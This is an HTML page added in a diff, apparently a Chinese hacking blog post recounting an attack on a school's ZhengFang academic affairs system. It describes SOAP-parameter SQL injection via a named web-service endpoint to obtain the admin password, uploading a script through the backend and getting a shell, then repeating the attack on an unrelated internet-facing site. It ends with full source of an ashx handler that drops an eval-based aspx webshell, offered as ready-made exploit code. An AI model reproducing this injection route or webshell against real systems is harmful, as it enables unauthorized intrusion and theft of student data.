@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<meta name="description" content="正方教务系统漏洞测试">
+<title>记正方教务一次检测体验回顾</title>
+<style>
+			body{
+				width: 100%;
+				height: 100%;
+				background-color:#B2DFEE;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+
+		</style>
+</head>
+
+<body>
+
+<div>
+<center><br/>
+
+<font style="FONT-FAMILY: Comic Sans MS;">
+<strong><h2>记正方教务一次检测体验回顾</h2></strong>过客</font></center><br/>
+<div>
+
+<p>&nbsp;&nbsp;最近呢，朋友发我一个链接，是有关正方系统的最新漏洞，我们学校刚好有这家伙啊，我就测试测试一下，再熟悉一下姿势，一起看看吧：</p><br/>
+<p>&nbsp;&nbsp;一、总结：对自己学校的正方一次检测（内网地址）：172.**.**.201/default.aspx。利用最近公布的漏洞(http://172.**.**201/service.asmx?op=**)，构造一下SOAP参数，进行注入得到管理密码，登陆后台上传ashx脚本，Getshell。</p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf1.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;二、正文首先访问http://172.**.**201/service.asmx?op=GetStuCheckinInfo。开始构造，repeater中进行重放。很简单，post一下就可以得到管理密码了： </p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf2.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;但是解密的过程，开始我遇到一个麻烦，开始没有看出来密文的加密算法(密文中有那么一段html转义代码)，我就花费了5块钱进一个收费群，看可以找正方的解密方法不，最终还是没有结果，压根就没人理我，你知道出了钱，没人帮忙那心情吗？！我就和队长说了我的事情，队长说，你这是不明智的选择呀，早点问我呀，一下子就解密了，还不花一分钱，哈哈，这都是队长太好了啦。</p><br/>
+<p>&nbsp;&nbsp;此处省略一千字，之后发生的事情就是，登陆后台，找上传，一个功能一个功能的查看，一个字眼一个字眼的推敲，然后测试上传(未修复状态下，可以上传ashx脚本，至于为什么可以上传，有没研究源码，自己想象。声明：若是上传ashx失败，那么你需要，继续注入，看版本，看服务，找用户，然后......)。</p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf3.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf4.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;并且可以访问，生成木马（利用ashx生成aspx），getshell：如下：很不好，我们学校有waf，shell连接菜刀的时候，被拦截。我那时候一点waf都不会绕过，我换了好多马儿，到了第二天还是没有拿下。好尴尬呀，我这技术多久才能成熟点呀。</p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf5.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;后来才知道脑洞需要大开啊。</p><br/>
+<p>&nbsp;&nbsp;到互联网上找个站再练习一下：利用方法一样，都是http://*.*.*.*/service.asmx?op=GetStuCheckinInfo。利用这个来参数注入得到管理密码，当然方法很多，你可以保存下来，丢进sqlmap找所有密码啦，等等，咱们再测试一下sql注入，想看妹子照片的就去玩玩正方，继续学习吧。</p><br/>
+<p>&nbsp;&nbsp;回归正题：依然是利用自己学校成功试验的地方上传(发布公告)。省略重复过程......</p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf6.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf7.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;最后呢，我们送上构造好的利用代码：</p><br/>
+<p>&nbsp;&nbsp;<center>
+<textarea rows="20" cols="100">
+ashx木马：
+<%@ WebHandler Language="C#" Class="Handler" %> 
+using System; 
+using System.Web; 
+using System.IO; 
+public class Handler : IHttpHandler { 
+      
+    public void ProcessRequest (HttpContext context) { 
+        context.Response.ContentType = "text/plain"; 
+        string show="<% @Page Language=\"Jscript\"%"+"><%eval(Request.Item"+"[\"pass\"]"+",\"unsafe\");%>"; 
+        StreamWriter file1= File.CreateText(context.Server.MapPath("test.aspx")); 
+        file1.Write(show); 
+        file1.Flush(); 
+        file1.Close(); 
+          
+    } 
+  
+    public bool IsReusable { 
+        get { 
+            return false; 
+        } 
+    } 
+  
+}
+
+</textarea>
+</center>
+</p><br/>
+<p>&nbsp;&nbsp;最后展示一下上面构造好的参数，放到SQLMAP中测试的结果：</p><br/>
+<p>&nbsp;&nbsp;<center><img src="../../images/zf8.jpg"></center>
+&nbsp;&nbsp;<center><img src="../../images/zf9.jpg"></center></p><br/>
+<p>&nbsp;&nbsp;结束语：本次测试，遇到一些小问题：  正方密码的开始的解密不会，这是一；其二，就是构造参数了，请看截图中(已展示)。</p><br/>
+<center>
+	<p style="display:none;">
+<textarea rows="1" cols="100">
+原文链接：http://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=11717
+</textarea>
+	</p>
+</center>
+</div><br/><br/><br/>
+
+</div>
+
+
+<center>
+<div><h4 >著：2016-9-9 22:19&nbsp;&nbsp;</a> </h4></div>
+<div><h4 >修：2017-3-14 15:30&nbsp;&nbsp;</a> </h4></div>
+</center></div><br/>
+<center><input type="button" name="button1" id="button1" value="返回上一页" onclick="history.go(-1)"> <br/><br/></center>
+<center><script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+</body>
+</html>
